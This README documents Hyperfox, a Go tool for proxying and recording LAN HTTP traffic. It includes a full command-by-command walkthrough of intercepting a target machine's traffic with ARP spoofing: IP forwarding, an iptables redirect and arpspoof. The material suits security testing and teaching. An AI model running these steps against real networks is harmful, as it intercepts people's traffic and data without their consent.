# Hyperfox

[Hyperfox][1] is a tool for proxying and recording HTTP and HTTPs
communications on a LAN.

The `github.com/xiam/hyperfox` package is a [Go][2] framework for creating
custom [man in the middle][3] or traffic interception tools, such as
[Hyperfox][1].

## Getting Hyperfox

Install with [Go][1] and [git][5] using `go get`:

```sh
> go get github.com/xiam/hyperfox
```

Precompiled packages may also be available at the [hyperfox.org][1] site.

## A common example: hyperfox with arpspoof

The following example assumes that hyperfox is installed on a Linux box (host)
on which you have root access or sudo privileges and that the target machine is
connected on the same LAN as the host.

We are going to use the `arpspoof` tool that is part of the [dsniff][4] suite
to alter the ARP table of the target machine in order to make it redirect its
traffic to Hyperfox instead of to the legitimate LAN gateway. This is an
ancient technique known as [ARP spoofing][6].

First, identify both the local IP of the legitimate gateway and the matching
network interface.

```
> sudo route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.0.0.1        0.0.0.0         UG    1024   0        0 wlan0
...
```

The interface in our example is called `wlan0` and the gateway for that
interface is `10.0.0.1`.

```
> export HYPERFOX_GW=10.0.0.1
> export HYPERFOX_IFACE=wlan0
```

Then identify the IP address of the target, let's suppose it is `10.0.0.143`.

```
> export HYPERFOX_TARGET=10.0.0.143
```

Enable IP forwarding on the host for it to act (temporarily) as a common
router.

```
> sudo sysctl -w net.ipv4.ip_forward=1
```

Issue an `iptables` rule to instruct the host to redirect all traffic that goes
to port 80 (commonly HTTP) to a local port where Hyperfox is listening to
(9999).

```
sudo iptables -A PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 80 -j REDIRECT --to-port 9999
```

We're almost ready, prepare hyperfox to receive traffic:

```
> hyperfox
2014/12/30 06:57:22 Hyperfox // https://www.hyperfox.org
2014/12/30 06:57:22 By José Carlos Nieto.

2014/12/30 06:57:22 See status at http://127.0.0.1:3030/
2014/12/30 06:57:22 Listening for HTTP client requests on 0.0.0.0:9999.
```

Finally, run `arpspoof` to alter the target's ARP table so it starts sending
its network traffic to the host box.

```sh
> sudo arpspoof -i $HYPERFOX_IFACE -t $HYPERFOX_TARGET $HYPERFOX_GW
```

## Contributing to Hyperfox development

Sure, there's a lot of opportunity. Choose an [issue][7], fix it and send a
pull request.

## License

> Copyright (c) 2012-2014 José Carlos Nieto, https://menteslibres.net/xiam
>
> Permission is hereby granted, free of charge, to any person obtaining
> a copy of this software and associated documentation files (the
> "Software"), to deal in the Software without restriction, including
> without limitation the rights to use, copy, modify, merge, publish,
> distribute, sublicense, and/or sell copies of the Software, and to
> permit persons to whom the Software is furnished to do so, subject to
> the following conditions:
>
> The above copyright notice and this permission notice shall be
> included in all copies or substantial portions of the Software.
>
> THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
> EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
> MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
> NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
> LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
> OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
> WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[1]: https://hyperfox.org
[2]: https://golang.org/doc/install
[3]: http://en.wikipedia.org/wiki/Man-in-the-middle_attack
[4]: http://monkey.org/~dugsong/dsniff/
[5]: http://git-scm.com
[6]: http://en.wikipedia.org/wiki/ARP_spoofing
[7]: https://github.com/xiam/hyperfox/issues
